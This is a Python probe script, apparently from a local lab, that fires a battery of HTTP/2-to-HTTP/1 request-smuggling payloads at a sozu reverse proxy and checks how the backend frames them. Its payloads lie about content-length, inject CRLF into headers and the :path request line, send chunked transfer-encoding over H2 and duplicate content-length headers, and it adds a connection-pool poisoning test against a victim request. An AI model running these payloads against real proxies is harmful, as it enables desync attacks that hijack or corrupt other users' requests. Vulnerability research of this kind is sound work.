"""sozu(kawa) H2 -> H1 downgrade probe battery. Client speaks HTTP/2 to sozu:8443;
sozu serializes H1 to the backend (tap_sb captures the emitted H1 -> conn_bk frames
it). A smuggle = the H1 sozu emits disagrees with the one H2 request it acknowledged
(CL-lie forwarded, request-line/ header injection, or the backend frames >1 REQ).
SENTINEL FIRST: a benign H2 GET must frame exactly 1 REQ before any silence counts.
Then each published H2->H1 primitive, each with the emitted H1 shown (mechanism), and
a pool-poisoning victim-after test on the standalone-END_STREAM case."""
import os
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from phage.evo import genome as G
from phage.evo.driver_h2 import send_h2

HOST, PORT = "127.0.0.1", 8443
BK = "logs/conn_bk.log"
TAP = "logs/tap_sb.jsonl"


def fsize(p):
    try:
        return os.path.getsize(p)
    except OSError:
        return 0


def delta(p, off):
    try:
        with open(p, "rb") as f:
            f.seek(off)
            return f.read()
    except OSError:
        return b""


def H(fields, end):
    return G.Headers(tuple(fields), end_stream=end)


PRE = [(b":scheme", b"https"), (b":authority", b"lab")]


def probe(genome, label, show=True):
    to, bo = fsize(TAP), fsize(BK)
    cli, clean = send_h2(HOST, PORT, genome, timeout=4.0, sni="lab")
    time.sleep(0.4)
    tap = delta(TAP, to)
    bk = delta(BK, bo)
    reqs = [l for l in bk.split(b"\n") if l.startswith(b"REQ ")]
    rst = b"reset" if (cli and not clean and len(cli) < 40) else b""
    if show:
        print(f"\n[{label}] resp={len(cli)}B reqs_framed={len(reqs)} rst?={bool(rst)}")
        print(f"  sozu->backend H1 ({len(tap)}B): {tap[:220]!r}")
        for r in reqs:
            print(f"  backend REQ: {r!r}")
    return len(reqs), tap, cli


def sentinel():
    n, _, _ = probe([H([(b":method", b"GET"), (b":path", b"/sentinel")] + PRE, True)],
                    "SENTINEL benign GET")
    if n != 1:
        print(f"SENTINEL FAIL ({n} reqs). Channel not proven. Stop.")
        sys.exit(1)
    print("SENTINEL OK.\n" + "=" * 60)


if __name__ == "__main__":
    sentinel()

    # 1. standalone-END_STREAM: CL:N declared, END_STREAM set, no DATA. The H2 analog
    #    of CVE-2026-33555. If sozu emits CL:10 with 0 body -> desync primitive.
    probe([H([(b":method", b"POST"), (b":path", b"/se"),
              (b"content-length", b"10")] + PRE, True)],
          "1 standalone-END_STREAM (CL:10, no DATA)")

    # 2. H2.CL, CL:0 but a DATA frame carries a body. If sozu forwards CL:0 + body,
    #    the backend reads the body as the next request.
    probe([H([(b":method", b"POST"), (b":path", b"/clzero"),
              (b"content-length", b"0")] + PRE, False),
           G.Data(b"GET /smuggled HTTP/1.1\r\nHost: lab\r\n\r\n", end_stream=True)],
          "2 H2.CL (CL:0 + DATA body)")

    # 3. H2.CL short: CL:5 but 20-byte DATA. Backend either over-reads or leaves 15.
    probe([H([(b":method", b"POST"), (b":path", b"/clshort"),
              (b"content-length", b"5")] + PRE, False),
           G.Data(b"AAAAAAAAAAAAAAAAAAAA", end_stream=True)],
          "3 H2.CL short (CL:5, 20B DATA)")

    # 4. CRLF injection in a regular header value -> H1 header/request splitting.
    probe([H([(b":method", b"GET"), (b":path", b"/crlf"),
              (b"x-inj", b"a\r\nX-Smuggled: 1\r\nFoo: b")] + PRE, True)],
          "4 CRLF-in-header-value")

    # 5. Request-line injection via :path (space + CRLF).
    probe([H([(b":method", b"GET"),
              (b":path", b"/a HTTP/1.1\r\nHost: evil\r\n\r\nGET /x")] + PRE, True)],
          "5 :path request-line injection")

    # 6. H2.TE: transfer-encoding: chunked over H2 (forbidden by RFC 9113 8.2.2).
    probe([H([(b":method", b"POST"), (b":path", b"/te"),
              (b"transfer-encoding", b"chunked")] + PRE, False),
           G.Data(b"0\r\n\r\nGET /smug HTTP/1.1\r\nHost: lab\r\n\r\n", end_stream=True)],
          "6 H2.TE (transfer-encoding: chunked)")

    # 7. duplicate content-length (conflicting).
    probe([H([(b":method", b"POST"), (b":path", b"/dupcl"),
              (b"content-length", b"0"), (b"content-length", b"20")] + PRE, False),
           G.Data(b"BBBBBBBBBBBBBBBBBBBB", end_stream=True)],
          "7 duplicate content-length (0 vs 20)")

    print("\n" + "=" * 60 + "\nPOOL-POISONING victim-after test (primitive 1):")
    # Re-fire standalone-END_STREAM, then a benign victim. If sozu forwarded CL:10 and
    # POOLED the backend conn, the victim's first 10 bytes are eaten as the missing body.
    probe([H([(b":method", b"POST"), (b":path", b"/poison"),
              (b"content-length", b"10")] + PRE, True)], "  poison (CL:10 no body)")
    n, _, _ = probe([H([(b":method", b"GET"), (b":path", b"/VICTIM")] + PRE, True)],
                    "  victim GET /VICTIM")
    print("\nVERDICT: victim framed cleanly as 'GET /VICTIM' => no poisoning; "
          "eaten/mangled => poisoning.")
